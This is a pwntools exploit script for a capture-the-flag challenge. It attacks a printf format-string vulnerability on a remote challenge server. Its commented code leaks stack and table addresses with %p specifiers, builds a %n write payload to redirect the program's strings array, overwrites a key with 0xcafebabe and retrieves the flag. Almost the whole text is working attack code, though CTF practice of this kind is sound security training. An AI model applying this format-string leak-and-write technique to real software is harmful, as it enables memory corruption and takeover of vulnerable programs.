#this is a printf vulnerability
#we are attacking this specific statement
#printf(strings[index]);
#in case 3 in the source code 

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

io = remote("chal.competitivecyber.club", 8888 )

print("This will take a while")

#create string where we will drop our initial format string vulnerability to
#leak the key address
io.sendlineafter(b'malloc', b'1')
io.sendlineafter(b'Size', b'6')

#write format string
io.sendlineafter(b'write', b'2')
io.sendlineafter(b'Index', b'0')
io.sendlineafter(b'String', b'%21$p')

#print format string
io.sendlineafter(b'read', b'3')
io.sendlineafter(b'Index', b'0')

#grab leaked address and calculate the address of key
addr = io.recvline()
addr = addr.split()
addr = int(addr[1], 16)
addr = addr - 0xe8

print(hex(addr))

#leak out the address of strings we should already have it from symbols but i want to be safe
io.sendlineafter(b'malloc', b'1')
io.sendlineafter(b'Size', b'300')

#write format string
io.sendlineafter(b'write', b'2')
io.sendlineafter(b'Index', b'1')
io.sendlineafter(b'String', b"%6$p" )

#print format string
io.sendlineafter(b'read', b'3')
io.sendlineafter(b'Index', b'1')

#grab leaked address of strings so we can modify the addresses on the strings table to point to key
strings = io.recvline()
strings = strings.split()
strings = int(strings[1], 16)

printer =  b"%" + str(int(strings/16)).encode() +  b"x."
payload =  printer * 16  + b"%6$n"

#time to write the payload
io.sendlineafter(b'malloc', b'1')
io.sendlineafter(b'Size', b'300')

#write format string to leak strings address (we should have it already from symbols, but just to be safe)
io.sendlineafter(b'write', b'2')
io.sendlineafter(b'Index', b'2')
io.sendlineafter(b'String', payload )


#print format string
io.sendlineafter(b'read', b'3')
io.sendlineafter(b'Index', b'2')

#now we have control over the strings array
#gamer time
io.sendlineafter(b'write', b'2')
io.sendlineafter(b'Index', b'2')
io.sendlineafter(b'String', p64(addr) )

#now write cafebabe
io.sendlineafter(b'write', b'2')
io.sendlineafter(b'Index', b'2')
io.sendlineafter(b'String', p32(0xcafebabe))

#print flag
io.sendlineafter(b'flag', b'5')
print(io.recvall().decode())
io.interactive()
